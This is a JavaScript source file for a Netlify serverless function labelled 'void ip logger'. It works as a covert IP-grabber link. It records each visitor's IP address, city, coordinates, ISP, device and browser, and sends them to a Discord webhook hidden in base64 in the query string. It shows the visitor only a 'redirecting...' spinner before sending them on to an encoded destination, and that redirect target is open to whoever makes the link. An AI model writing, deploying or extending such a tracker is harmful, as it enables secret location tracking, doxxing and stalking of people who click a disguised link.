
// Netlify serverless function for IP logging
exports.handler = async (event, context) => {
  try {
    // Get parameters from query string
    const params = event.queryStringParameters;
    const id = params.id || 'unknown';
    const dest = params.dest ? atob(params.dest) : 'https://google.com';
    const webhook = params.hook ? atob(params.hook) : null;
    
    // Get visitor information
    const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown';
    const userAgent = event.headers['user-agent'] || 'unknown';
    const referer = event.headers['referer'] || 'direct';
    
    // Get IP information from ipinfo.io
    let ipInfo = {};
    try {
      const response = await fetch(`https://ipinfo.io/${ip}/json`);
      ipInfo = await response.json();
    } catch (error) {
      console.error('Error fetching IP info:', error);
    }
    
    // Prepare visitor data
    const visitorData = {
      ip: ip,
      location: {
        city: ipInfo.city || 'unknown',
        region: ipInfo.region || 'unknown',
        country: ipInfo.country || 'unknown',
        coordinates: ipInfo.loc || 'unknown',
        timezone: ipInfo.timezone || 'unknown'
      },
      device: {
        userAgent: userAgent,
        platform: getPlatform(userAgent),
        browser: getBrowser(userAgent)
      },
      network: {
        isp: ipInfo.org || 'unknown',
        hostname: ipInfo.hostname || 'unknown'
      },
      visit: {
        time: new Date().toISOString(),
        referrer: referer,
        trackingId: id
      }
    };
    
    // Log visitor data
    console.log('Visitor data:', JSON.stringify(visitorData));
    
    // Send to Discord webhook if available
    if (webhook) {
      try {
        await sendToDiscord(webhook, visitorData);
      } catch (error) {
        console.error('Error sending to Discord:', error);
      }
    }
    
    // Store in database (in a real implementation)
    // This would store the visitor data in a database for later retrieval
    
    // Return HTML that redirects to the destination
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html',
      },
      body: `
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Redirecting...</title>
          <style>
            body {
              font-family: 'Inter', sans-serif;
              background-color: #0a0a0a;
              color: #f5f5f5;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
            }
            .loader {
              border: 4px solid rgba(255, 255, 255, 0.1);
              border-radius: 50%;
              border-top: 4px solid #0066ff;
              width: 40px;
              height: 40px;
              animation: spin 1s linear infinite;
            }
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            p {
              margin-top: 20px;
              font-size: 16px;
              opacity: 0.7;
            }
          </style>
          <script>
            // Redirect after a short delay
            setTimeout(() => {
              window.location.href = "${dest}";
            }, 1500);
          </script>
        </head>
        <body>
          <div class="loader-container">
            <div class="loader"></div>
            <p>redirecting...</p>
          </div>
        </body>
        </html>
      `
    };
  } catch (error) {
    console.error('Error:', error);
    
    // Return error page
    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'text/html',
      },
      body: `
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Error</title>
          <style>
            body {
              font-family: 'Inter', sans-serif;
              background-color: #0a0a0a;
              color: #f5f5f5;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              flex-direction: column;
            }
            .error {
              color: #ff3333;
              font-size: 24px;
              margin-bottom: 20px;
            }
            p {
              margin-top: 20px;
              font-size: 16px;
              opacity: 0.7;
            }
          </style>
          <script>
            // Redirect to Google after a short delay
            setTimeout(() => {
              window.location.href = "https://google.com";
            }, 3000);
          </script>
        </head>
        <body>
          <div class="error">Error</div>
          <p>Something went wrong. Redirecting to Google...</p>
        </body>
        </html>
      `
    };
  }
};

// Helper function to get platform from user agent
function getPlatform(userAgent) {
  if (userAgent.includes('Windows')) return 'Windows';
  if (userAgent.includes('Mac')) return 'macOS';
  if (userAgent.includes('Android')) return 'Android';
  if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
  if (userAgent.includes('Linux')) return 'Linux';
  return 'Unknown';
}

// Helper function to get browser from user agent
function getBrowser(userAgent) {
  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome';
  if (userAgent.includes('Firefox')) return 'Firefox';
  if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
  if (userAgent.includes('Edg')) return 'Edge';
  if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) return 'Internet Explorer';
  return 'Unknown';
}

// Helper function to send data to Discord webhook
async function sendToDiscord(webhookUrl, visitorData) {
  const payload = {
    embeds: [{
      title: 'new visitor detected',
      color: 0x0066ff,
      fields: [
        {
          name: 'ip address',
          value: visitorData.ip,
          inline: true
        },
        {
          name: 'location',
          value: `${visitorData.location.city}, ${visitorData.location.country}`,
          inline: true
        },
        {
          name: 'coordinates',
          value: visitorData.location.coordinates,
          inline: true
        },
        {
          name: 'device',
          value: `${visitorData.device.platform}, ${visitorData.device.browser}`,
          inline: false
        },
        {
          name: 'isp',
          value: visitorData.network.isp,
          inline: false
        },
        {
          name: 'referrer',
          value: visitorData.visit.referrer,
          inline: false
        },
        {
          name: 'time',
          value: visitorData.visit.time,
          inline: false
        }
      ],
      footer: {
        text: 'void ip logger'
      }
    }]
  };
  
  await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });
}

// Helper function to decode base64
function atob(str) {
  return Buffer.from(str, 'base64').toString('utf-8');
}
